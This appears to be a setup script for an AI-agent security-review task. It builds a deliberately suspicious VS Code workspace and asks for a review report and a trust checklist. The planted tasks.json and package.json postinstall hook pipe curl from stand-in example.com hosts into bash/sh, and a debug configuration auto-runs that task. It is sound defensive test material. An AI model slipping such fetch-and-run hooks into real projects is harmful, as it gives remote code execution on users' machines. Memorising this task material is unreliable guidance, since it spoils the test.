#!/bin/bash
# set -euo pipefail

source /workspace/scripts/task_utils.sh

echo "=== Setting up Review Untrusted Workspace Task ==="

WORKSPACE_DIR="/home/ga/workspace/untrusted_pr"
VSCODE_DIR="$WORKSPACE_DIR/.vscode"

# Create untrusted workspace with realistic but suspicious PR code
sudo -u ga mkdir -p "$WORKSPACE_DIR"
sudo -u ga mkdir -p "$VSCODE_DIR"

# Create a realistic but potentially suspicious tasks.json
cat > "$VSCODE_DIR/tasks.json" << 'EOF'
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "Build Project",
      "type": "shell",
      "command": "npm run build",
      "problemMatcher": []
    },
    {
      "label": "Install Dependencies",
      "type": "shell",
      "command": "npm install && curl -s https://analytics.example.com/install.sh | bash",
      "problemMatcher": []
    },
    {
      "label": "Run Tests",
      "type": "shell",
      "command": "npm test",
      "problemMatcher": []
    },
    {
      "label": "Deploy",
      "type": "shell",
      "command": "rsync -avz . user@remote:/deploy && ssh user@remote 'cd /deploy && npm start'",
      "problemMatcher": []
    }
  ]
}
EOF

# Create settings.json with some potentially concerning settings
cat > "$VSCODE_DIR/settings.json" << 'EOF'
{
  "editor.formatOnSave": true,
  "editor.defaultFormatter": "custom.formatter",
  "files.autoSave": "afterDelay",
  "files.autoSaveDelay": 500,
  "python.linting.enabled": true,
  "task.autoDetect": "on",
  "npm.runInTerminal": true,
  "npm.scriptExplorerAction": "run",
  "terminal.integrated.shellArgs.linux": ["-c", "source ~/.bashrc && exec bash"],
  "extensions.autoUpdate": true,
  "extensions.autoCheckUpdates": true
}
EOF

# Create package.json with suspicious postinstall script
cat > "$WORKSPACE_DIR/package.json" << 'EOF'
{
  "name": "community-contribution",
  "version": "1.0.0",
  "description": "A helpful contribution to the project",
  "main": "app.js",
  "scripts": {
    "start": "node app.js",
    "build": "webpack --mode production",
    "test": "jest",
    "postinstall": "node scripts/setup.js && curl -s https://metrics.example.com/track?pkg=community-contribution | sh",
    "prepare": "husky install"
  },
  "dependencies": {
    "express": "^4.18.0",
    "lodash": "^4.17.21"
  },
  "devDependencies": {
    "jest": "^29.0.0",
    "webpack": "^5.75.0"
  }
}
EOF

# Create extensions.json with some recommendations
cat > "$VSCODE_DIR/extensions.json" << 'EOF'
{
  "recommendations": [
    "dbaeumer.vscode-eslint",
    "esbenp.prettier-vscode",
    "ms-python.python",
    "unknown-publisher.suspicious-extension"
  ]
}
EOF

# Create launch.json with debug configuration
cat > "$VSCODE_DIR/launch.json" << 'EOF'
{
  "version": "0.2.0",
  "configurations": [
    {
      "type": "node",
      "request": "launch",
      "name": "Launch Program",
      "program": "${workspaceFolder}/app.js",
      "preLaunchTask": "Install Dependencies"
    }
  ]
}
EOF

# Create a sample source file to make it look legitimate
cat > "$WORKSPACE_DIR/app.js" << 'EOF'
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.get('/api/data', (req, res) => {
  res.json({ message: 'This is a helpful API endpoint' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
EOF

# Create README to make it look like a real PR
cat > "$WORKSPACE_DIR/README.md" << 'EOF'
# Community Contribution

This PR adds a new API endpoint and improves the build process.

## Changes
- Added `/api/data` endpoint
- Updated build configuration
- Added automated deployment task

## Testing
Run `npm test` to verify all tests pass.
EOF

# Create a placeholder scripts directory
sudo -u ga mkdir -p "$WORKSPACE_DIR/scripts"
cat > "$WORKSPACE_DIR/scripts/setup.js" << 'EOF'
console.log('Running setup...');
// Setup script placeholder
EOF

# Set ownership
sudo chown -R ga:ga "$WORKSPACE_DIR"

# Create task instructions file
cat > /home/ga/TASK_INSTRUCTIONS.txt << 'EOF'
SECURITY REVIEW TASK
====================

WORKSPACE: /home/ga/workspace/untrusted_pr

You must perform a security review of this untrusted workspace before deciding to trust it.

REQUIRED DELIVERABLES:

1. Create: /home/ga/workspace/untrusted_pr/SECURITY_REVIEW.md
   Must include:
   - Files Inspected: List all configuration files you reviewed
   - Suspicious Patterns Found: Document any security concerns with specific examples
   - Security Concerns: Explain why these patterns are dangerous
   - Trust Decision: State whether to trust this workspace and your reasoning

2. Create: /home/ga/workspace/untrusted_pr/TRUST_CHECKLIST.md
   Must include at least 5 categories of security patterns to check:
   - Example categories: Command Execution, Network Access, File Operations, Auto-run Behaviors, etc.
   - Each category should list specific patterns to watch for

SUSPICIOUS PATTERNS TO INVESTIGATE:
- Remote command execution (curl/wget piped to bash/sh)
- Postinstall scripts with network requests
- File system operations
- Auto-run settings
- Unfamiliar extension recommendations
- Pre-launch tasks in debug configurations

FILES TO INSPECT:
- .vscode/tasks.json
- .vscode/settings.json
- .vscode/extensions.json
- .vscode/launch.json
- package.json
EOF

sudo chown ga:ga /home/ga/TASK_INSTRUCTIONS.txt

# Open VSCode with the untrusted workspace
echo "Opening VSCode with untrusted workspace..."
su - ga -c "DISPLAY=:1 code '$WORKSPACE_DIR' --new-window" &
wait_for_vscode 20
wait_for_window "Visual Studio Code" 30

# Click center to focus correct desktop
su - ga -c "DISPLAY=:1 xdotool mousemove 600 600 click 1" || true
sleep 2

focus_vscode_window

echo "=== Review Untrusted Workspace Task Setup Complete ==="
echo "📝 Workspace created at: $WORKSPACE_DIR"
echo "⚠️  Workspace contains suspicious configuration files"
echo "📋 Instructions available at: /home/ga/TASK_INSTRUCTIONS.txt"
echo ""
echo "Expected deliverables:"
echo "  1. $WORKSPACE_DIR/SECURITY_REVIEW.md"
echo "  2. $WORKSPACE_DIR/TRUST_CHECKLIST.md"